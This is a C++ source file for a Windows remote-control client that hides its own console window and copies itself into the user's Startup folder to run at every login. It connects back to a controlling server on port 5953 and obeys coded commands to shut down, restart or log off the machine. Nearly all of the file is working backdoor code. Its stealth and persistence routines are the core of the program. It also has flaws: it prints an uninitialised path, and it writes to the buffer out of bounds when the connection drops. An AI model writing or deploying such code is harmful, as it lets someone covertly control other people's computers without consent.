#include <winsock2.h>
#include <stdio.h>
#include <iostream>
#include <thread>
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include <fcntl.h>
#include <unistd.h>

void SaveOnStartUp();
void HandleCommands(std::string command, SOCKET sock);
void Hide();

struct sockaddr_in server_info;
SOCKET sock;
WSADATA wsa;
// const char* ip_address = "192.168.1.15";

int main() {
	Hide();
	SaveOnStartUp();

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
	    printf("Failed. Error Code: %d\n", WSAGetLastError());
	    return 0;
	}

	server_info.sin_family = AF_INET;
	server_info.sin_port = htons(5953);

	std::string ip_address = "";
	std::cout << "Enter IP address: ";
	std::cin >> ip_address;
	server_info.sin_addr.s_addr = inet_addr(ip_address.c_str());
	
	// create the socket
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		perror("Socket creation failed");
		WSACleanup();
		return 0;
	}

	bool is_connected = false;
	while (!is_connected) {	// connect to the server
		int res = connect(sock, (struct sockaddr*)&server_info, sizeof(server_info));

		std::cout << "Result from connect(): " << res << '\n';

		if (res == 0) {
			std::cout << "Connected to the server." << '\n';
			send(sock, "234", 3, 0);
			is_connected = true;
			break;
		} else {
			std::cout << "[!] Failed to connect to the server." << '\n'; 
			std::cout << "[~] Trying again." << '\n'; 
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}
	}

	while (is_connected) {
		char buffer[1024] = {0};
		int received = recv(sock, buffer, sizeof(buffer)-1, 0);  // Ensure space for null-termination
		buffer[received] = '\0';

		std::string converted = std::string(buffer);

		if (received <= 0) {
			std::string t;
			std::cout << "[!] Server sent this data: " << received << '\n';
			std::cout << "[!] Disconnected from the server." << '\n';

			std::cin >> t;
			break;
		}

		if (converted == "ping") send(sock, "pong", 4, 0);
		else HandleCommands(converted, sock);
	}

	std::cout << "[!] Disconnected from the server" << '\n';
	closesocket(sock);
	exit(1);
	return 0;
}

void HandleCommands(std::string command, SOCKET sock) {
	if (command == "229892") {
		std::cout << "Server sent a shutdown signal.\n"; // shutdown
		send(sock, "ok", 2, 0);
		std::this_thread::sleep_for(std::chrono::seconds(2));	
		system("shutdown /s /t 5");
	} else if (command == "893234") {
		std::cout << "Server sent a restart signal.\n"; // restart
		send(sock, "ok", 2, 0);
		std::this_thread::sleep_for(std::chrono::seconds(2));	
		system("shutdown /r");	
	} else if (command == "126773") {
		std::cout << "Server sent a lock signal.\n"; // lock
		send(sock, "ok", 2, 0);
		std::this_thread::sleep_for(std::chrono::seconds(2));	
		ExitWindows(0, 0);
	}
}

void Hide() {
	AllocConsole();
	HWND win = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(win, 0);
}

void SaveOnStartUp() {
    char currentPath[MAX_PATH];
    if (GetModuleFileName(NULL, currentPath, MAX_PATH) == 0) {
        std::cerr << "Failed to get the executable path." << std::endl;
        return;
    }

    printf("exe path: %s\n", currentPath);

    char destinationPath[MAX_PATH];
    const char* appDataDir = getenv("APPDATA"); // Get the AppData directory
    if (appDataDir == NULL) {
        std::cerr << "Failed to get AppData directory." << std::endl;
        return;
    }

    printf("destination path: %s\n", destinationPath);

    snprintf(destinationPath, MAX_PATH, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.exe", appDataDir);

    if (CopyFile(currentPath, destinationPath, FALSE) == 0) {
        std::cerr << "Failed to copy the file. Error: " << GetLastError() << std::endl;
        return;
    }

    std::cout << "Executable saved to: " << destinationPath << std::endl;
    return ;
}